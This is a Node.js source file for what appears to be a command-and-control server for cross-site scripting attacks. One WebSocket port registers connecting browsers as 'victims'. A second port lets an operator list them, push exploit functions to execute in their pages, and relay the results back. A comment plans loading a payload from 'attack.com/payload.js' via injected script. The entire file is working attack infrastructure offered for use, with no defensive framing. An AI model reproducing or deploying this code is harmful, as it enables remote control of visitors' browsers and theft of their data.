const ws = require('ws')

const config = require('./config')
const exploits = require('./exploits')

const victims = {}

function handle_cmd(conn, cmd, args) {
    // TODO Implement these in separate functions
    // TODO Change cmds to an object like { 'func_name': func_ref }
    // TODO Add an import command to allow importing custom exploits
    const cmds = ['help', 'list', 'exploit']
    switch(cmd) {
        case 'help':
            conn.send(cmds.join('|'))
            break
        case 'list':
            const listables = ['victims', 'exploits']
            if(args.length < 1) {
                conn.send('Usage: list [' + listables.join('|') + ']')
            }
            switch(args[0]) {
                case 'victims':
                    conn.send('' + Object.keys(victims))
                    break
                case 'exploits':
                    conn.send('' + Object.keys(exploits))
                    break
                default:
                    conn.send('The argument must be either "' + listables.join('" or "') + '"')
                    break
            }
            break
        case 'exploit':
            if(args.length < 2) {
                conn.send('Usage: exploit who what\r\nTo do what to who')
                break
            }
            const who = args[0]
            if(victims[who] == undefined || !Object.keys(victims).includes(who)) {
                conn.send(who + ' is not a victim')
                break
            }
            const what = args[1]
            if(exploits[what] == undefined || !Object.keys(exploits).includes(what)) {
                conn.send(what + ' is not an exploit')
                break
            }
            const vic_conn = victims[who]
            vic_conn.on('message', data => conn.send(data))
            vic_conn.send('(' + exploits[what] + ')()')
            console.log('Sent ' + what + ' to ' + who)
            break
        default:
            conn.send('Implemented commands: ' + cmds.join(','))
            break
    }
}

function main() {
    const CMD_PORT = config.cmd_port
    new ws.Server({ port: CMD_PORT })
    .on('connection', conn => {
        conn.on('message', data => {
            const cmdarr = data.split(' ')
            const cmd = cmdarr[0]
            const args = cmdarr.slice(1)
            handle_cmd(conn, cmd, args)
        })
    })
    console.log('Command server running on port ' + CMD_PORT)

    // TODO Add a payload server so XSS can just do <script src='attack.com/payload.js'>

    const EXPLOIT_PORT = config.exploit_port
    new ws.Server({ port: EXPLOIT_PORT })
    .on('connection', (conn, req) => {
        const vic_name = req.connection.remoteAddress + ':' + req.connection.remotePort
        victims[vic_name] = conn
        console.log('New victim ' + vic_name)
        // TODO Implement the ability to automatically run commands on connect
        conn.on('close', () => delete victims[vic_name])
    })
    console.log('Exploit server running on port ' + EXPLOIT_PORT)
}

main()
